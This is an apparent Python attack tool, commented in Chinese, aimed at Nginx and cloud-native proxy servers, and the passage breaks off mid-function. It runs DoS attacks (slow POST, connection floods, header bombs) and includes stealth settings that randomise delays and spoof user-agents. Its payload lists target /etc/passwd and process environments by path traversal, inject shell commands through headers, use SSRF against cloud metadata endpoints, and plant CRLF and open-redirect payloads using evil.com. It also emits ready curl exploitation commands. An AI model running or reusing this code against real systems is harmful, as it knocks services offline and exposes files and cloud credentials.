#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nginx DoS三明治探针模型 + 云原生架构双模探测器
强化方案高精度DoS检测逻辑 + 内外网情景感知探测能力
"""

import asyncio
import socket
import ssl
import time
import statistics
import random
try:
    import socks  # PySocks库，用于SOCKS代理支持
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[!] Warning: PySocks not available. Internal mode proxy support disabled.")
from typing import Dict, List, Optional, Tuple


# 双模探测端口配置
EXTERNAL_PROBE_PORTS = [80, 443, 8000, 8443]  # 外部扫描：只探测常见Web端口

INTERNAL_PROBE_PORTS = [
    # 常见的Envoy/Istio管理端口
    15000, 15001, 15014, 9901, 19000,
    # 常见的控制面/API端口  
    8080, 9090, 9443,
    # 常见的Web端口也包含在内
    80, 443, 8000, 8443
]

# 渐进式探测分层策略
PROBE_LAYERS = {
    'surface': [80, 443],                      # 第一层：表面探测
    'extended_web': [8000, 8080, 8443, 9090], # 第二层：扩展Web端口  
    'admin_interfaces': [15000, 15001, 9901], # 第三层：管理接口
    'deep_control': [15014, 19000, 9443]      # 第四层：深度控制面
}

# 内网探测规避配置
STEALTH_CONFIG = {
    'min_delay': 0.5,      # 最小请求间隔（秒）
    'max_delay': 2.0,      # 最大请求间隔（秒）
    'user_agents': [       # 内网请求伪装User-Agent
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'curl/7.68.0',
        'python-requests/2.28.1',
        'Go-http-client/1.1'
    ]
}


class NginxDoSAnalyzer:
    """Nginx DoS三明治探针分析器"""
    
    def __init__(self, target_host: str, target_port: int = 80, timeout: float = 5.0):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.baseline_samples = 3
        self.recovery_samples = 5
        
    async def nginx_dos_sandwich_probe(self) -> Dict:
        """三明治健康探针：攻击前-攻击中-攻击后"""
        
        print(f"[*] Starting Nginx DoS sandwich probe on {self.target_host}:{self.target_port}")
        
        try:
            # 第一步：建立健康基线
            print(f"[*] Phase 1: Establishing baseline health metrics...")
            baseline = await self._establish_baseline()
            
            if baseline['success_rate'] < 0.5:
                return {
                    'status': 'baseline_failed',
                    'evidence': f"Baseline success rate too low: {baseline['success_rate']:.2f}",
                    'impact': 'Unable to establish reliable baseline - target may already be unstable'
                }
            
            # 第二步：执行攻击探针
            print(f"[*] Phase 2: Executing DoS attack vectors...")
            attack_result = await self._execute_dos_attack()
            
            # 第三步：健康状态验证
            print(f"[*] Phase 3: Verifying post-attack recovery...")
            recovery_status = await self._verify_recovery(baseline)
            
            # 第四步：综合分析结果
            analysis = self._analyze_dos_impact(baseline, attack_result, recovery_status)
            
            return analysis
            
        except Exception as e:
            return {
                'status': 'test_error',
                'evidence': f'DoS sandwich probe failed: {e}',
                'impact': 'Unable to complete DoS vulnerability assessment'
            }
    
    async def _establish_baseline(self) -> Dict:
        """建立3次正常请求的基线"""
        baseline_times = []
        successful_requests = 0
        
        for i in range(self.baseline_samples):
            print(f"[*] Baseline sample {i+1}/{self.baseline_samples}")
            start_time = time.perf_counter()
            
            try:
                response_info = await self._send_health_check()
                response_time = (time.perf_counter() - start_time) * 1000
                baseline_times.append(response_time)
                successful_requests += 1
                
                print(f"    Response time: {response_time:.1f}ms, Status: {response_info.get('status', 'Unknown')}")
                
            except Exception as e:
                baseline_times.append(float('inf'))  # 标记为异常
                print(f"    Request failed: {e}")
            
            # 短暂延迟避免请求过快
            await asyncio.sleep(0.5)
        
        # 过滤有效时间
        valid_times = [t for t in baseline_times if t != float('inf')]
        
        return {
            'avg_response_time': statistics.mean(valid_times) if valid_times else float('inf'),
            'std_deviation': statistics.stdev(valid_times) if len(valid_times) > 1 else 0,
            'success_rate': successful_requests / self.baseline_samples,
            'raw_times': baseline_times,
            'successful_requests': successful_requests
        }
    
    async def _execute_dos_attack(self) -> Dict:
        """执行DoS攻击向量"""
        attack_results = {}
        
        # 攻击向量1：HTTP慢速POST攻击
        print(f"[*] Testing slow POST attack...")
        slow_post_result = await self._slow_post_attack()
        attack_results['slow_post'] = slow_post_result
        
        # 攻击向量2：大量并发连接
        print(f"[*] Testing connection flood...")
        flood_result = await self._connection_flood_attack()
        attack_results['connection_flood'] = flood_result
        
        # 攻击向量3：HTTP header bomb
        print(f"[*] Testing header bomb attack...")
        header_bomb_result = await self._header_bomb_attack()
        attack_results['header_bomb'] = header_bomb_result
        
        return attack_results
    
    async def _slow_post_attack(self) -> Dict:
        """HTTP慢速POST攻击"""
        try:
            if self.target_port == 443:
                # HTTPS连接
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port, ssl=ctx),
                    timeout=self.timeout
                )
            else:
                # HTTP连接
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
            
            # 发送慢速POST请求
            slow_request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Content-Length: 1000000\r\n"  # 声明大量数据
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            
            writer.write(slow_request.encode())
            await writer.drain()
            
            # 慢速发送少量数据
            for _ in range(5):
                writer.write(b"a" * 10)
                await writer.drain()
                await asyncio.sleep(2)  # 每2秒发送一点数据
            
            # 检查服务器响应
            try:
                response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
                if b"408" in response or b"timeout" in response.lower():
                    result = "server_timeout_protection"
                elif b"400" in response:
                    result = "server_rejected_malformed"
                else:
                    result = "attack_accepted"
            except asyncio.TimeoutError:
                result = "server_hanging"
            
            writer.close()
            await writer.wait_closed()
            
            return {
                'result': result,
                'evidence': f'Slow POST attack: {result}',
                'successful': result in ['attack_accepted', 'server_hanging']
            }
            
        except Exception as e:
            return {
                'result': 'attack_failed',
                'evidence': f'Slow POST attack failed: {e}',
                'successful': False
            }
    
    async def _connection_flood_attack(self) -> Dict:
        """并发连接洪泛攻击"""
        try:
            # 同时建立20个连接
            connection_tasks = []
            for i in range(20):
                task = asyncio.create_task(self._create_hanging_connection())
                connection_tasks.append(task)
            
            # 等待所有连接建立
            results = await asyncio.gather(*connection_tasks, return_exceptions=True)
            
            successful_connections = sum(1 for r in results if r is True)
            failed_connections = len(results) - successful_connections
            
            # 短暂等待，然后检查服务器状态
            await asyncio.sleep(2)
            
            # 尝试正常连接测试服务器是否仍然响应
            try:
                health_check = await self._send_health_check()
                server_responsive = True
            except:
                server_responsive = False
            
            return {
                'successful_connections': successful_connections,
                'failed_connections': failed_connections,
                'server_responsive': server_responsive,
                'evidence': f'Flood: {successful_connections}/20 connections, server responsive: {server_responsive}',
                'successful': successful_connections >= 15 and not server_responsive
            }
            
        except Exception as e:
            return {
                'result': 'flood_failed',
                'evidence': f'Connection flood failed: {e}',
                'successful': False
            }
    
    async def _header_bomb_attack(self) -> Dict:
        """HTTP header bomb攻击"""
        try:
            if self.target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port, ssl=ctx),
                    timeout=self.timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
            
            # 构造大量HTTP头部
            headers = [
                f"GET / HTTP/1.1\r\n",
                f"Host: {self.target_host}\r\n"
            ]
            
            # 添加100个自定义头部
            for i in range(100):
                headers.append(f"X-Custom-Header-{i}: {'A' * 1000}\r\n")
            
            headers.append("\r\n")
            
            bomb_request = "".join(headers)
            
            start_time = time.perf_counter()
            writer.write(bomb_request.encode())
            await writer.drain()
            
            # 检查响应
            try:
                response = await asyncio.wait_for(reader.read(1024), timeout=5.0)
                response_time = (time.perf_counter() - start_time) * 1000
                
                if b"431" in response:  # Request Header Fields Too Large
                    result = "server_protected"
                elif b"400" in response:
                    result = "server_rejected"
                elif b"200" in response:
                    result = "headers_accepted"
                else:
                    result = "unknown_response"
                    
            except asyncio.TimeoutError:
                response_time = (time.perf_counter() - start_time) * 1000
                result = "server_timeout"
            
            writer.close()
            await writer.wait_closed()
            
            return {
                'result': result,
                'response_time': response_time,
                'evidence': f'Header bomb: {result}, response time: {response_time:.1f}ms',
                'successful': result in ['headers_accepted', 'server_timeout'] and response_time > 3000
            }
            
        except Exception as e:
            return {
                'result': 'bomb_failed',
                'evidence': f'Header bomb attack failed: {e}',
                'successful': False
            }
    
    async def _create_hanging_connection(self) -> bool:
        """创建一个挂起的连接"""
        try:
            if self.target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port, ssl=ctx),
                    timeout=self.timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
            
            # 发送不完整的HTTP请求但不关闭连接
            partial_request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
            writer.write(partial_request.encode())
            await writer.drain()
            
            # 保持连接挂起3秒
            await asyncio.sleep(3)
            
            writer.close()
            return True
            
        except Exception:
            return False
    
    async def _verify_recovery(self, baseline: Dict) -> str:
        """攻击后立即进行5次健康检查"""
        recovery_times = []
        successful_recoveries = 0
        
        print(f"[*] Checking recovery status with {self.recovery_samples} samples...")
        
        for i in range(self.recovery_samples):
            start_time = time.perf_counter()
            
            try:
                response_info = await self._send_health_check()
                response_time = (time.perf_counter() - start_time) * 1000
                recovery_times.append(response_time)
                successful_recoveries += 1
                
                print(f"    Recovery sample {i+1}: {response_time:.1f}ms")
                
            except Exception as e:
                recovery_times.append(float('inf'))
                print(f"    Recovery sample {i+1}: FAILED - {e}")
            
            await asyncio.sleep(0.3)
        
        # 与基线对比分析
        anomaly_count = 0
        baseline_avg = baseline['avg_response_time']
        baseline_std = baseline['std_deviation']
        
        for time_val in recovery_times:
            if time_val == float('inf'):
                anomaly_count += 1
            elif baseline_avg != float('inf') and time_val > baseline_avg + 2 * baseline_std:
                anomaly_count += 1
        
        # 判断恢复状态
        if anomaly_count >= 4:  # 5次中有4次异常
            return "SERVICE_CRASHED"
        elif anomaly_count >= 2:
            return "SERVICE_AFFECTED"
        else:
            return "SERVICE_HEALTHY"
    
    async def _send_health_check(self) -> Dict:
        """发送健康检查请求"""
        if self.target_port == 443:
            # HTTPS请求
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, self.target_port, ssl=ctx),
                timeout=self.timeout
            )
        else:
            # HTTP请求
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, self.target_port),
                timeout=self.timeout
            )
        
        # 发送简单GET请求
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"User-Agent: NginxDoSProbe/1.0\r\n"
            f"Connection: close\r\n\r\n"
        )
        
        writer.write(request.encode())
        await writer.drain()
        
        # 读取响应
        response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
        
        writer.close()
        await writer.wait_closed()
        
        # 解析状态码
        response_text = response.decode('utf-8', errors='ignore')
        if 'HTTP/' in response_text:
            status_line = response_text.split('\r\n')[0]
            status_code = status_line.split(' ')[1] if len(status_line.split(' ')) > 1 else 'Unknown'
        else:
            status_code = 'Unknown'
        
        return {
            'status': status_code,
            'response_size': len(response),
            'response_preview': response_text[:200]
        }
    
    def _analyze_dos_impact(self, baseline: Dict, attack_result: Dict, recovery_status: str) -> Dict:
        """综合分析DoS影响"""
        
        # 统计攻击成功率
        successful_attacks = 0
        total_attacks = 0
        
        attack_details = []
        
        for attack_type, result in attack_result.items():
            total_attacks += 1
            if result.get('successful', False):
                successful_attacks += 1
                attack_details.append(f"{attack_type}: SUCCESS")
            else:
                attack_details.append(f"{attack_type}: FAILED")
        
        # 确定总体影响级别
        if recovery_status == "SERVICE_CRASHED":
            impact_level = "CRITICAL"
            impact_description = "Service crashed or severely impacted"
        elif recovery_status == "SERVICE_AFFECTED" and successful_attacks >= 2:
            impact_level = "HIGH"
            impact_description = "Service significantly affected by multiple attack vectors"
        elif successful_attacks >= 2:
            impact_level = "MEDIUM"
            impact_description = "Multiple attack vectors successful but service recovered"
        elif successful_attacks >= 1:
            impact_level = "LOW"
            impact_description = "Some attack vectors successful"
        else:
            impact_level = "NONE"
            impact_description = "No successful DoS attacks detected"
        
        return {
            'impact_level': impact_level,
            'impact_description': impact_description,
            'recovery_status': recovery_status,
            'successful_attacks': successful_attacks,
            'total_attacks': total_attacks,
            'attack_success_rate': successful_attacks / total_attacks if total_attacks > 0 else 0,
            'baseline_health': baseline,
            'attack_details': attack_details,
            'evidence': f"DoS Impact: {impact_level} - {successful_attacks}/{total_attacks} attacks successful, recovery: {recovery_status}",
            'vulnerable': impact_level in ['CRITICAL', 'HIGH', 'MEDIUM']
        }
    
    async def detect_config_traps(self) -> Dict:
        """检测Nginx配置陷阱 - 高价值社会学攻击"""
        
        print(f"[*] Detecting Nginx configuration traps on {self.target_host}:{self.target_port}")
        
        config_vulnerabilities = []
        total_tests = 0
        vulnerable_count = 0
        
        # 1. 路径穿越配置错误检测
        print("[*] Phase 1: Testing path traversal misconfigurations...")
        path_traversal_results = await self._test_path_traversal_configs()
        total_tests += path_traversal_results['tests_performed']
        vulnerable_count += path_traversal_results['vulnerabilities_found']
        if path_traversal_results['vulnerabilities']:
            config_vulnerabilities.extend(path_traversal_results['vulnerabilities'])
        
        # 2. 变量注入配置错误检测
        print("[*] Phase 2: Testing variable injection misconfigurations...")
        var_injection_results = await self._test_variable_injection()
        total_tests += var_injection_results['tests_performed']
        vulnerable_count += var_injection_results['vulnerabilities_found']
        if var_injection_results['vulnerabilities']:
            config_vulnerabilities.extend(var_injection_results['vulnerabilities'])
        
        # 3. Proxy_pass配置错误检测
        print("[*] Phase 3: Testing proxy_pass misconfigurations...")
        proxy_pass_results = await self._test_proxy_pass_configs()
        total_tests += proxy_pass_results['tests_performed']
        vulnerable_count += proxy_pass_results['vulnerabilities_found']
        if proxy_pass_results['vulnerabilities']:
            config_vulnerabilities.extend(proxy_pass_results['vulnerabilities'])
        
        # 4. Rewrite规则错误检测
        print("[*] Phase 4: Testing rewrite rule misconfigurations...")
        rewrite_results = await self._test_rewrite_configs()
        total_tests += rewrite_results['tests_performed']
        vulnerable_count += rewrite_results['vulnerabilities_found']
        if rewrite_results['vulnerabilities']:
            config_vulnerabilities.extend(rewrite_results['vulnerabilities'])
        
        # 5. 别名（alias）配置错误检测
        print("[*] Phase 5: Testing alias misconfigurations...")
        alias_results = await self._test_alias_configs()
        total_tests += alias_results['tests_performed']
        vulnerable_count += alias_results['vulnerabilities_found']
        if alias_results['vulnerabilities']:
            config_vulnerabilities.extend(alias_results['vulnerabilities'])
        
        # 分析结果
        if vulnerable_count > 0:
            severity = "CRITICAL" if any(v['severity'] == 'CRITICAL' for v in config_vulnerabilities) else "HIGH"
            return {
                'vulnerable': True,
                'severity': severity,
                'total_tests': total_tests,
                'vulnerabilities_found': vulnerable_count,
                'config_vulnerabilities': config_vulnerabilities,
                'impact': f"Found {vulnerable_count} configuration vulnerabilities that could lead to LFI/RCE",
                'recommendation': "Review and fix nginx configuration immediately"
            }
        else:
            return {
                'vulnerable': False,
                'severity': 'NONE',
                'total_tests': total_tests,
                'vulnerabilities_found': 0,
                'config_vulnerabilities': [],
                'impact': "No configuration vulnerabilities detected",
                'recommendation': "Configuration appears secure"
            }
    
    async def _test_path_traversal_configs(self) -> Dict:
        """测试路径穿越配置错误"""
        vulnerabilities = []
        tests_performed = 0
        
        # 测试向量
        path_traversal_vectors = [
            # 基础路径穿越
            ("/../../../etc/passwd", "root:x:0:0:root"),
            ("/../../../etc/hosts", "127.0.0.1"),
            ("/../../../proc/self/environ", "PATH="),
            # URL编码绕过
            ("/..%2F..%2F..%2Fetc%2Fpasswd", "root:x:0:0:root"),
            ("/..%252F..%252F..%252Fetc%252Fpasswd", "root:x:0:0:root"),
            # Unicode编码绕过
            ("/\u002e\u002e/\u002e\u002e/etc/passwd", "root:x:0:0:root"),
            # 变量拼接绕过
            ("/static/../../../etc/passwd", "root:x:0:0:root"),
            ("/download/../../../etc/passwd", "root:x:0:0:root"),
            # Windows路径（如果是Windows服务器）
            ("/../../../windows/win.ini", "[fonts]"),
            ("/..\\..\\..\\windows\\win.ini", "[fonts]"),
        ]
        
        # 常见的易受攻击的路径前缀
        vulnerable_prefixes = [
            "/static", "/download", "/files", "/documents", 
            "/uploads", "/public", "/assets", "/resources"
        ]
        
        for prefix in vulnerable_prefixes:
            for vector, expected in path_traversal_vectors:
                tests_performed += 1
                test_url = f"{prefix}{vector}"
                
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, self.target_port),
                        timeout=self.timeout
                    )
                    
                    request = f"GET {test_url} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += "User-Agent: Mozilla/5.0 (Security Scanner)\r\n"
                    request += "Accept: */*\r\n"
                    request += "Connection: close\r\n\r\n"
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                        if not chunk:
                            break
                        response += chunk
                    
                    response_str = response.decode('utf-8', errors='ignore')
                    
                    # 检查响应
                    if expected in response_str and "404" not in response_str and "403" not in response_str:
                        vulnerabilities.append({
                            'type': 'PATH_TRAVERSAL',
                            'severity': 'CRITICAL',
                            'path': test_url,
                            'evidence': f"Successfully accessed file via {test_url}",
                            'impact': 'Local File Inclusion (LFI) - Can read arbitrary files',
                            'exploitation': f"curl 'http://{self.target_host}{test_url}'"
                        })
                        print(f"[+] CRITICAL: Path traversal found at {test_url}")
                    
                    writer.close()
                    await writer.wait_closed()
                    
                except Exception as e:
                    pass
        
        return {
            'tests_performed': tests_performed,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    async def _test_variable_injection(self) -> Dict:
        """测试Nginx变量注入配置错误"""
        vulnerabilities = []
        tests_performed = 0
        
        # 测试向量 - 利用Nginx变量处理不当
        variable_injection_vectors = [
            # $uri 变量注入
            {"path": "/test", "headers": {"X-Original-URI": "/../../../etc/passwd"}},
            {"path": "/test", "headers": {"X-Forwarded-Path": "/../../../etc/passwd"}},
            # $request_uri 注入
            {"path": "/proxy/../../../etc/passwd", "headers": {}},
            # $arg_* 变量注入
            {"path": "/download?file=../../../etc/passwd", "headers": {}},
            {"path": "/view?path=../../../etc/passwd", "headers": {}},
            # HTTP头部变量注入
            {"path": "/", "headers": {"X-Real-IP": "'; cat /etc/passwd; echo '"}},
            {"path": "/", "headers": {"X-Forwarded-For": "$(cat /etc/passwd)"}},
            # Host头注入
            {"path": "/", "headers": {"Host": "../../../etc/passwd"}},
        ]
        
        for vector in variable_injection_vectors:
            tests_performed += 1
            
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                
                request = f"GET {vector['path']} HTTP/1.1\r\n"
                request += f"Host: {vector['headers'].get('Host', self.target_host)}\r\n"
                
                # 添加测试头部
                for header, value in vector['headers'].items():
                    if header != 'Host':
                        request += f"{header}: {value}\r\n"
                
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Connection: close\r\n\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                response = b""
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    response += chunk
                
                response_str = response.decode('utf-8', errors='ignore')
                
                # 检查是否成功注入
                if any(indicator in response_str for indicator in ["root:x:0:0", "daemon:", "/bin/bash"]):
                    vulnerabilities.append({
                        'type': 'VARIABLE_INJECTION',
                        'severity': 'HIGH',
                        'vector': vector,
                        'evidence': f"Variable injection successful via {vector}",
                        'impact': 'Can inject malicious values into Nginx variables',
                        'exploitation': f"Inject via {vector['path']} with headers: {vector['headers']}"
                    })
                    print(f"[+] HIGH: Variable injection found with vector: {vector}")
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass
        
        return {
            'tests_performed': tests_performed,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    async def _test_proxy_pass_configs(self) -> Dict:
        """测试proxy_pass配置错误"""
        vulnerabilities = []
        tests_performed = 0
        
        # proxy_pass常见配置错误
        proxy_pass_vectors = [
            # 缺少尾部斜杠导致的路径拼接问题
            "/api../admin",
            "/api../../../etc/passwd",
            "/proxy../internal",
            # SSRF向量
            "/proxy/http://169.254.169.254/latest/meta-data/",
            "/api/http://localhost:8080/admin",
            "/forward/file:///etc/passwd",
            # 路径规范化绕过
            "/api/./admin",
            "/api//admin",
            "/api/;/admin",
            # URL编码绕过
            "/api%2e%2e/admin",
            "/api%2f%2fadmin",
        ]
        
        for vector in proxy_pass_vectors:
            tests_performed += 1
            
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                
                request = f"GET {vector} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Connection: close\r\n\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                response = b""
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    response += chunk
                
                response_str = response.decode('utf-8', errors='ignore')
                status_line = response_str.split('\r\n')[0] if response_str else ""
                
                # 检查SSRF或未授权访问
                if any(indicator in response_str for indicator in [
                    "ami-id", "instance-id",  # AWS metadata
                    "computeMetadata",  # GCP metadata
                    "admin", "dashboard", "internal",  # 内部页面
                    "root:x:0:0"  # 文件读取
                ]):
                    vulnerabilities.append({
                        'type': 'PROXY_PASS_MISCONFIGURATION',
                        'severity': 'CRITICAL',
                        'path': vector,
                        'evidence': f"Accessed internal resource via {vector}",
                        'impact': 'SSRF or unauthorized access to internal resources',
                        'exploitation': f"curl 'http://{self.target_host}{vector}'"
                    })
                    print(f"[+] CRITICAL: Proxy_pass misconfiguration at {vector}")
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass
        
        return {
            'tests_performed': tests_performed,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    async def _test_rewrite_configs(self) -> Dict:
        """测试rewrite规则配置错误"""
        vulnerabilities = []
        tests_performed = 0
        
        # Rewrite规则常见错误
        rewrite_vectors = [
            # 开放重定向
            {"path": "/redirect?url=http://evil.com", "check": "Location: http://evil.com"},
            {"path": "/go?target=//evil.com", "check": "Location: //evil.com"},
            {"path": "/jump?to=@evil.com", "check": "Location:"},
            # 路径注入
            {"path": "/old/../admin", "check": ["admin", "dashboard"]},
            {"path": "/legacy/../../etc/passwd", "check": "root:x:0:0"},
            # CRLF注入
            {"path": "/test%0d%0aSet-Cookie:%20hacked=true", "check": "Set-Cookie: hacked=true"},
            {"path": "/page%0d%0aLocation:%20http://evil.com", "check": "Location: http://evil.com"},
        ]
        
        for vector in rewrite_vectors:
            tests_performed += 1
            
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                
                request = f"GET {vector['path']} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Connection: close\r\n\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                response = b""
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    response += chunk
                
                response_str = response.decode('utf-8', errors='ignore')
                
                # 检查漏洞
                check_items = vector['check'] if isinstance(vector['check'], list) else [vector['check']]
                if any(check in response_str for check in check_items):
                    vuln_type = 'OPEN_REDIRECT' if 'Location:' in response_str else 'REWRITE_INJECTION'
                    vulnerabilities.append({
                        'type': vuln_type,
                        'severity': 'HIGH',
                        'path': vector['path'],
                        'evidence': f"Rewrite rule vulnerability: {vector['path']}",
                        'impact': 'Open redirect or path injection via rewrite rules',
                        'exploitation': f"curl -v 'http://{self.target_host}{vector['path']}'"
                    })
                    print(f"[+] HIGH: Rewrite vulnerability at {vector['path']}")
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass
        
        return {
            'tests_performed': tests_performed,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    async def _test_alias_configs(self) -> Dict:
        """测试alias配置错误"""
        vulnerabilities = []
        tests_performed = 0
        
        # Alias配置常见错误 - 缺少尾部斜杠
        alias_vectors = [
            "/img../etc/passwd",
            "/static../../../etc/passwd",
            "/files../../../etc/hosts",
            "/download../../../proc/self/environ",
            "/content../etc/nginx/nginx.conf",
            "/media../../../home/",
        ]
        
        # 常见的alias路径
        common_alias_paths = ["/img", "/static", "/files", "/download", "/content", "/media", "/assets"]
        
        for base_path in common_alias_paths:
            for suffix in ["../etc/passwd", "../../../etc/passwd", "../etc/nginx/nginx.conf"]:
                tests_performed += 1
                test_path = f"{base_path}{suffix}"
                
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, self.target_port),
                        timeout=self.timeout
                    )
                    
                    request = f"GET {test_path} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += "Connection: close\r\n\r\n"
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                        if not chunk:
                            break
                        response += chunk
                    
                    response_str = response.decode('utf-8', errors='ignore')
                    
                    # 检查是否读取到文件
                    if any(indicator in response_str for indicator in [
                        "root:x:0:0", "daemon:", "nobody:",  # /etc/passwd
                        "server {", "location", "proxy_pass",  # nginx.conf
                        "127.0.0.1", "localhost"  # /etc/hosts
                    ]):
                        vulnerabilities.append({
                            'type': 'ALIAS_TRAVERSAL',
                            'severity': 'CRITICAL',
                            'path': test_path,
                            'evidence': f"File accessed via alias traversal: {test_path}",
                            'impact': 'Local file inclusion via alias misconfiguration',
                            'exploitation': f"curl 'http://{self.target_host}{test_path}'"
                        })
                        print(f"[+] CRITICAL: Alias traversal at {test_path}")
                    
                    writer.close()
                    await writer.wait_closed()
                    
                except Exception as e:
                    pass
        
        return {
            'tests_performed': tests_performed,
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }
    
    async def detect_module_risks(self) -> Dict:
        """检测Nginx危险模块 - 高价值侦察"""
        
        print(f"[*] Detecting dangerous Nginx modules on {self.target_host}:{self.target_port}")
        
        module_risks = []
        total_tests = 0
        risks_found = 0
        
        # 1. WebDAV模块检测
        print("[*] Phase 1: Detecting WebDAV module...")
        webdav_results = await self._detect_webdav_module()
        total_tests += webdav_results['tests_performed']
        if webdav_results['detected']:
            risks_found += 1
            module_risks.append(webdav_results)
        
        # 2. AutoIndex模块检测
        print("[*] Phase 2: Detecting AutoIndex module...")
        autoindex_results = await self._detect_autoindex_module()
        total_tests += autoindex_results['tests_performed']
        if autoindex_results['detected']:
            risks_found += 1
            module_risks.append(autoindex_results)
        
        # 3. Lua模块检测
        print("[*] Phase 3: Detecting Lua module...")
        lua_results = await self._detect_lua_module()
        total_tests += lua_results['tests_performed']
        if lua_results['detected']:
            risks_found += 1
            module_risks.append(lua_results)
        
        # 4. Perl模块检测
        print("[*] Phase 4: Detecting Perl module...")
        perl_results = await self._detect_perl_module()
        total_tests += perl_results['tests_performed']
        if perl_results['detected']:
            risks_found += 1
            module_risks.append(perl_results)
        
        # 5. 不安全的第三方模块检测
        print("[*] Phase 5: Detecting unsafe third-party modules...")
        third_party_results = await self._detect_third_party_modules()
        total_tests += third_party_results['tests_performed']
        risks_found += third_party_results['modules_found']
        if third_party_results['modules']:
            module_risks.extend(third_party_results['modules'])
        
        # 分析结果
        if risks_found > 0:
            severity = "HIGH" if any(m.get('severity') == 'HIGH' for m in module_risks) else "MEDIUM"
            return {
                'vulnerable': True,
                'severity': severity,
                'total_tests': total_tests,
                'risks_found': risks_found,
                'module_risks': module_risks,
                'impact': f"Found {risks_found} potentially dangerous modules enabled",
                'recommendation': "Disable unnecessary modules to reduce attack surface"
            }
        else:
            return {
                'vulnerable': False,
                'severity': 'NONE',
                'total_tests': total_tests,
                'risks_found': 0,
                'module_risks': [],
                'impact': "No dangerous modules detected",
                'recommendation': "Module configuration appears secure"
            }
    
    async def _detect_webdav_module(self) -> Dict:
        """检测WebDAV模块"""
        tests_performed = 0
        
        # WebDAV特定的HTTP方法
        webdav_methods = ['OPTIONS', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK']
        webdav_detected = False
        supported_methods = []
        writable_paths = []
        
        # 测试根路径和常见路径
        test_paths = ['/', '/webdav/', '/dav/', '/files/', '/upload/', '/share/']
        
        for path in test_paths:
            # 1. OPTIONS请求检测支持的方法
            tests_performed += 1
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                
                request = f"OPTIONS {path} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Connection: close\r\n\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                response = b""
                while True:
